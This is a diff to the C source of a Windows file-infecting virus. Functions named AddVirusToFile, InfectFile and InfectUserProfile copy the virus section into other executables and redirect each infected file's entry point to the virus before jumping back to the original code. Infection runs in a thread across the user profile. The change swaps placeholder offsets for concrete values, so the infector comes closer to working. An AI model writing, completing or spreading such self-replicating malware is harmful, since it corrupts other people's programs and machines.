@@ -2,28 +2,20 @@
 
 #include "shared.h"
 
-void ModifyJumpInstructionToVirusCode(PVOID data, DWORD entry_point, DWORD main_addrress);
-
-void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD new_file_size);
+void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, const PDATA data, LPDWORD new_file_size);
 
 int main();
 
-void ModifyJumpInstructionToVirusCode(PVOID data, DWORD entry_point, DWORD main_addrress)
-{
-    if ( *((PUCHAR)data + entry_point) != 0xe9 )
-    {
-        return;
-    }
-    *(PDWORD)((PUCHAR)data + entry_point + 1) = main_addrress - (entry_point + 5);
-    return;
-}
-
-void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD new_file_size)
+void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, const PDATA data, LPDWORD new_file_size)
 {
     PVOID section_data = NULL;
     DWORD section_size = 0;
     DWORD virus_section_va = 0;
     PIMAGE_SECTION_HEADER virus_section = GetCurrentVirusSection(data->this_file_base_address);
+    DWORD virus_va_in_target;
+    DWORD target_entry_point;
+
+    target_entry_point = GetEntryPoint(file_data);
 
     virus_section_va = virus_section->VirtualAddress;
     section_size = virus_section->SizeOfRawData;
@@ -36,19 +28,21 @@ void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD
 
     MemCopy(section_data, (PUCHAR)data->this_file_base_address + virus_section_va, section_size);
 
-    ModifyJumpInstructionToVirusCode(section_data, GetEntryPoint(data->this_file_base_address) - virus_section_va, (DWORD)((DWORD)&main - (DWORD)data->this_file_base_address) - virus_section_va);
-
     PIMAGE_SECTION_HEADER virus_section_in_target = AddVirusSection(file_data, &file_size, section_data, section_size, data);
+
+    virus_va_in_target = virus_section_in_target->VirtualAddress;
 
     if (Is64BitExecutable(file_data))
     {
-        DWORD entry_point_64bit = 0x41414141;
-        SetEntryPoint(file_data, virus_section_in_target->VirtualAddress + entry_point_64bit);
+        DWORD entry_point_64bit = 0x28F0;
+        SetEntryPoint(file_data, virus_va_in_target + entry_point_64bit);
+        *(DWORD*)((PUCHAR*)file_data + 0x2945) = target_entry_point - (virus_va_in_target + 0x2949) ;
     }
     else
     {
-        DWORD entry_point_32bit = 0x41414141;
-        SetEntryPoint(file_data, virus_section_in_target->VirtualAddress + entry_point_32bit);
+        DWORD entry_point_32bit = 0xca0;
+        SetEntryPoint(file_data, virus_va_in_target + entry_point_32bit);
+        *(DWORD*)((PUCHAR*)file_data + 0xcdc) = target_entry_point - (virus_va_in_target + 0xce0);
     }
 
     data->iat->fnVirtualFree(
@@ -61,7 +55,7 @@ void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD
     return;
 }
 
-void WINAPI InfectFile(PSTR file_name, PDATA data)
+void WINAPI InfectFile(PSTR file_name, const PDATA data)
 {
     HANDLE handle_file;
     HANDLE handle_mapped_file;
@@ -147,9 +141,13 @@ int main()
     IAT iat;
     DATA data;
     data.iat = &iat;
-    GetFunctionAddresses(&data);
-    data.iat->fnCreateThread(NULL, 0, InfectUserProfile, &data, 0, NULL);
+    data.end_virus = 0;
+    HANDLE handle_thread;
+    GetFunctionAddresses(&data);    
+    handle_thread = data.iat->fnCreateThread(NULL, 0, InfectUserProfile, (PVOID)(&data), 0, NULL);
     EmptyFunction();
+    data.end_virus = 1;
+    data.iat->fnWaitForSingleObject(handle_thread, INFINITE);
     return 0;
 }
 
